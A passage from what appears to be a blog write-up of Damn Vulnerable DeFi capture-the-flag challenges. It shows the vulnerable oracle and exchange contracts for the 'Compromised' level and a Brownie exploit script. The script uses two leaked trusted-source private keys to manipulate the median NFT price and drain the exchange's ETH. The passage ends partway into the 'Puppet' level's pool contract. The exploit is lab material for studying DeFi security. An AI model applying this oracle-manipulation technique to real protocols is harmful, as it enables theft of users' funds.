<h3 id="TrustfulOracle-sol"><a href="#TrustfulOracle-sol" class="headerlink" title="TrustfulOracle.sol"></a>TrustfulOracle.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/access/AccessControlEnumerable.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">TrustfulOracle</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@notice</span> A price oracle with a number of trusted sources that individually report prices for symbols.</span></span><br><span class="line"><span class="comment"> *         The oracle&#x27;s price for a given symbol is the median price of the symbol over all sources.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">TrustfulOracle</span> is <span class="title class_">AccessControlEnumerable</span> &#123;</span><br><span class="line"></span><br><span class="line">    bytes32 public constant <span class="variable constant_">TRUSTED_SOURCE_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;TRUSTED_SOURCE_ROLE&quot;</span>);</span><br><span class="line">    bytes32 public constant <span class="variable constant_">INITIALIZER_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;INITIALIZER_ROLE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source address =&gt; (symbol =&gt; price)</span></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> mapping (<span class="function"><span class="params">string</span> =&gt;</span> uint256)) private pricesBySource;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyTrustedSource</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">hasRole</span>(<span class="variable constant_">TRUSTED_SOURCE_ROLE</span>, msg.<span class="property">sender</span>));</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyInitializer</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">hasRole</span>(<span class="variable constant_">INITIALIZER_ROLE</span>, msg.<span class="property">sender</span>));</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">UpdatedPrice</span>(</span><br><span class="line">        address indexed source,</span><br><span class="line">        string indexed symbol,</span><br><span class="line">        uint256 oldPrice,</span><br><span class="line">        uint256 newPrice</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address[] memory sources, bool enableInitialization</span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(sources.<span class="property">length</span> &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(uint256 i = <span class="number">0</span>; i &lt; sources.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="title function_">_setupRole</span>(<span class="variable constant_">TRUSTED_SOURCE_ROLE</span>, sources[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (enableInitialization) &#123;</span><br><span class="line">            <span class="title function_">_setupRole</span>(<span class="variable constant_">INITIALIZER_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A handy utility allowing the deployer to setup initial prices (only once)</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setupInitialPrices</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address[] memory sources,</span></span><br><span class="line"><span class="params">        string[] memory symbols,</span></span><br><span class="line"><span class="params">        uint256[] memory prices</span></span><br><span class="line"><span class="params">    </span>) </span><br><span class="line">        public</span><br><span class="line">        onlyInitializer</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Only allow one (symbol, price) per source</span></span><br><span class="line">        <span class="built_in">require</span>(sources.<span class="property">length</span> == symbols.<span class="property">length</span> &amp;&amp; symbols.<span class="property">length</span> == prices.<span class="property">length</span>);</span><br><span class="line">        <span class="keyword">for</span>(uint256 i = <span class="number">0</span>; i &lt; sources.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="title function_">_setPrice</span>(sources[i], symbols[i], prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">renounceRole</span>(<span class="variable constant_">INITIALIZER_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">postPrice</span>(<span class="params">string calldata symbol, uint256 newPrice</span>) external onlyTrustedSource &#123;</span><br><span class="line">        <span class="title function_">_setPrice</span>(msg.<span class="property">sender</span>, symbol, newPrice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getMedianPrice</span>(<span class="params">string calldata symbol</span>) external view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_computeMedianPrice</span>(symbol);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getAllPricesForSymbol</span>(<span class="params">string memory symbol</span>) public view returns (uint256[] memory) &#123;</span><br><span class="line">        uint256 numberOfSources = <span class="title function_">getNumberOfSources</span>();</span><br><span class="line">        uint256[] memory prices = <span class="keyword">new</span> uint256[](numberOfSources);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; numberOfSources; i++) &#123;</span><br><span class="line">            address source = <span class="title function_">getRoleMember</span>(<span class="variable constant_">TRUSTED_SOURCE_ROLE</span>, i);</span><br><span class="line">            prices[i] = <span class="title function_">getPriceBySource</span>(symbol, source);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> prices;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getPriceBySource</span>(<span class="params">string memory symbol, address source</span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> pricesBySource[source][symbol];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getNumberOfSources</span>(<span class="params"></span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">getRoleMemberCount</span>(<span class="variable constant_">TRUSTED_SOURCE_ROLE</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_setPrice</span>(<span class="params">address source, string memory symbol, uint256 newPrice</span>) private &#123;</span><br><span class="line">        uint256 oldPrice = pricesBySource[source][symbol];</span><br><span class="line">        pricesBySource[source][symbol] = newPrice;</span><br><span class="line">        emit <span class="title class_">UpdatedPrice</span>(source, symbol, oldPrice, newPrice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_computeMedianPrice</span>(<span class="params">string memory symbol</span>) private view returns (uint256) &#123;</span><br><span class="line">        uint256[] memory prices = <span class="title function_">_sort</span>(<span class="title function_">getAllPricesForSymbol</span>(symbol));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calculate median price</span></span><br><span class="line">        <span class="keyword">if</span> (prices.<span class="property">length</span> % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            uint256 leftPrice = prices[(prices.<span class="property">length</span> / <span class="number">2</span>) - <span class="number">1</span>];</span><br><span class="line">            uint256 rightPrice = prices[prices.<span class="property">length</span> / <span class="number">2</span>];</span><br><span class="line">            <span class="keyword">return</span> (leftPrice + rightPrice) / <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> prices[prices.<span class="property">length</span> / <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_sort</span>(<span class="params">uint256[] memory arrayOfNumbers</span>) private pure returns (uint256[] memory) &#123;</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; arrayOfNumbers.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (uint256 j = i + <span class="number">1</span>; j &lt; arrayOfNumbers.<span class="property">length</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (arrayOfNumbers[i] &gt; arrayOfNumbers[j]) &#123;</span><br><span class="line">                    uint256 tmp = arrayOfNumbers[i];</span><br><span class="line">                    arrayOfNumbers[i] = arrayOfNumbers[j];</span><br><span class="line">                    arrayOfNumbers[j] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="keyword">return</span> arrayOfNumbers;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Exchange-sol"><a href="#Exchange-sol" class="headerlink" title="Exchange.sol"></a>Exchange.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./TrustfulOracle.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableNFT.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">Exchange</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">Exchange</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address payable;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">DamnValuableNFT</span> public immutable token;</span><br><span class="line">    <span class="title class_">TrustfulOracle</span> public immutable oracle;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">TokenBought</span>(address indexed buyer, uint256 tokenId, uint256 price);</span><br><span class="line">    event <span class="title class_">TokenSold</span>(address indexed seller, uint256 tokenId, uint256 price);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address oracleAddress</span>) payable &#123;</span><br><span class="line">        token = <span class="keyword">new</span> <span class="title class_">DamnValuableNFT</span>();</span><br><span class="line">        oracle = <span class="title class_">TrustfulOracle</span>(oracleAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">buyOne</span>(<span class="params"></span>) external payable nonReentrant returns (uint256) &#123;</span><br><span class="line">        uint256 amountPaidInWei = msg.<span class="property">value</span>;</span><br><span class="line">        <span class="built_in">require</span>(amountPaidInWei &gt; <span class="number">0</span>, <span class="string">&quot;Amount paid must be greater than zero&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Price should be in [wei / NFT]</span></span><br><span class="line">        uint256 currentPriceInWei = oracle.<span class="title function_">getMedianPrice</span>(token.<span class="title function_">symbol</span>());</span><br><span class="line">        <span class="built_in">require</span>(amountPaidInWei &gt;= currentPriceInWei, <span class="string">&quot;Amount paid is not enough&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uint256 tokenId = token.<span class="title function_">safeMint</span>(msg.<span class="property">sender</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">payable</span>(msg.<span class="property">sender</span>).<span class="title function_">sendValue</span>(amountPaidInWei - currentPriceInWei);</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">TokenBought</span>(msg.<span class="property">sender</span>, tokenId, currentPriceInWei);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tokenId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sellOne</span>(<span class="params">uint256 tokenId</span>) external nonReentrant &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == token.<span class="title function_">ownerOf</span>(tokenId), <span class="string">&quot;Seller must be the owner&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(token.<span class="title function_">getApproved</span>(tokenId) == <span class="title function_">address</span>(<span class="variable language_">this</span>), <span class="string">&quot;Seller must have approved transfer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Price should be in [wei / NFT]</span></span><br><span class="line">        uint256 currentPriceInWei = oracle.<span class="title function_">getMedianPrice</span>(token.<span class="title function_">symbol</span>());</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> &gt;= currentPriceInWei, <span class="string">&quot;Not enough ETH in balance&quot;</span>);</span><br><span class="line"></span><br><span class="line">        token.<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), tokenId);</span><br><span class="line">        token.<span class="title function_">burn</span>(tokenId);</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">payable</span>(msg.<span class="property">sender</span>).<span class="title function_">sendValue</span>(currentPriceInWei);</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">TokenSold</span>(msg.<span class="property">sender</span>, tokenId, currentPriceInWei);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We must steal the funds from the <code>exchange</code> contract to complete this challenge. To do that, we can buy a <code>DVNFT</code> at a low price and sell at a high price, here instead of waiting for the price to increase, we can manipulate the price of the token since we have <strong>2 of the private keys</strong> of the <strong>TrustedSources</strong>.</p>
<h3 id="compromised-py"><a href="#compromised-py" class="headerlink" title="compromised.py"></a>compromised.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> DamnValuableNFT, Exchange, TrustfulOracle, TrustfulOracleInitializer, accounts, chain, Wei, web3</span><br><span class="line"></span><br><span class="line">sources = [</span><br><span class="line">    <span class="string">&#x27;0xA73209FB1a42495120166736362A1DfA9F95A105&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xe92401A4d3af5E446d93D11EEc806b1462b39D15&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x81A5D6E50C214044bE44cA0CB057fe119097850c&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">EXCHANGE_INITIAL_ETH_BALANCE = Wei(<span class="string">&#x27;9990 ether&#x27;</span>)</span><br><span class="line">INITIAL_NFT_PRICE = Wei(<span class="string">&#x27;999 ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy</span>():</span><br><span class="line">    deployer, attacker = accounts[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sources:</span><br><span class="line">        deployer.transfer(i, <span class="string">&quot;2 ether&quot;</span>)</span><br><span class="line">        <span class="keyword">assert</span> web3.eth.getBalance(i) == Wei(<span class="string">&#x27;2 ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    attacker.transfer(deployer, attacker.balance()-<span class="string">&quot;0.1 ether&quot;</span>)</span><br><span class="line">    <span class="keyword">assert</span> attacker.balance() == <span class="string">&quot;0.1 ether&quot;</span></span><br><span class="line"></span><br><span class="line">    oracle = TrustfulOracle.at(</span><br><span class="line">        TrustfulOracleInitializer.deploy(</span><br><span class="line">            sources,</span><br><span class="line">            [<span class="string">&#x27;DVNFT&#x27;</span>, <span class="string">&#x27;DVNFT&#x27;</span>, <span class="string">&#x27;DVNFT&#x27;</span>],</span><br><span class="line">            [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],</span><br><span class="line">            &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;</span><br><span class="line">        ).oracle()</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    exchange = Exchange.deploy(</span><br><span class="line">        oracle, &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: EXCHANGE_INITIAL_ETH_BALANCE&#125;)</span><br><span class="line"></span><br><span class="line">    nftToken = DamnValuableNFT.at(exchange.token())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deployer, attacker, nftToken, exchange, oracle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">attacker, nftToken, exchange, oracle</span>):</span><br><span class="line"></span><br><span class="line">    private_keys = [<span class="string">&#x27;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&#x27;</span>]</span><br><span class="line">    compromised_users = [accounts.add(i) <span class="keyword">for</span> i <span class="keyword">in</span> private_keys]</span><br><span class="line"></span><br><span class="line">    buying_prices = [<span class="string">&#x27;0 ether&#x27;</span>, <span class="string">&#x27;0.1 ether&#x27;</span>]</span><br><span class="line">    selling_prices = [exchange.balance() + <span class="string">&#x27;0.1 ether&#x27;</span>, <span class="string">&#x27;100000 ether&#x27;</span>]</span><br><span class="line">    reset_prices = [INITIAL_NFT_PRICE]*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(compromised_users):</span><br><span class="line">        oracle.postPrice(<span class="string">&#x27;DVNFT&#x27;</span>, buying_prices[i], &#123;<span class="string">&#x27;from&#x27;</span>: j&#125;)</span><br><span class="line"></span><br><span class="line">    tokenId = exchange.buyOne(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: attacker, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;0.1 ether&#x27;</span>&#125;).return_value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(compromised_users):</span><br><span class="line">        oracle.postPrice(<span class="string">&#x27;DVNFT&#x27;</span>, selling_prices[i], &#123;<span class="string">&#x27;from&#x27;</span>: j&#125;)</span><br><span class="line"></span><br><span class="line">    nftToken.approve(exchange, tokenId, &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line">    exchange.sellOne(tokenId, &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(compromised_users):</span><br><span class="line">        oracle.postPrice(<span class="string">&#x27;DVNFT&#x27;</span>, reset_prices[i], &#123;<span class="string">&#x27;from&#x27;</span>: j&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">attacker, nftToken, exchange, oracle</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> exchange.balance() == <span class="number">0</span></span><br><span class="line">    <span class="keyword">assert</span> attacker.balance() &gt; EXCHANGE_INITIAL_ETH_BALANCE</span><br><span class="line">    <span class="keyword">assert</span> nftToken.balanceOf(attacker) == <span class="number">0</span></span><br><span class="line">    <span class="keyword">assert</span> oracle.getMedianPrice(<span class="string">&#x27;DVNFT&#x27;</span>) == INITIAL_NFT_PRICE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer, attacker, nftToken, exchange, oracle = deploy()</span><br><span class="line"></span><br><span class="line">    exploit(attacker, nftToken,  exchange, oracle)</span><br><span class="line"></span><br><span class="line">    after(attacker, nftToken, exchange, oracle)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Puppet"><a href="#Puppet" class="headerlink" title="Puppet"></a>Puppet</h2><p>There’s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.</p>
<p>There’s a DVT market opened in an <a target="_blank" rel="noopener" href="https://docs.uniswap.org/protocol/V1">Uniswap v1 exchange</a>, currently with 10 ETH and 10 DVT in liquidity.</p>
<p>Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.</p>
<h3 id="PuppetPool-sol"><a href="#PuppetPool-sol" class="headerlink" title="PuppetPool.sol"></a>PuppetPool.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableToken.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">PuppetPool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">PuppetPool</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address payable;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span 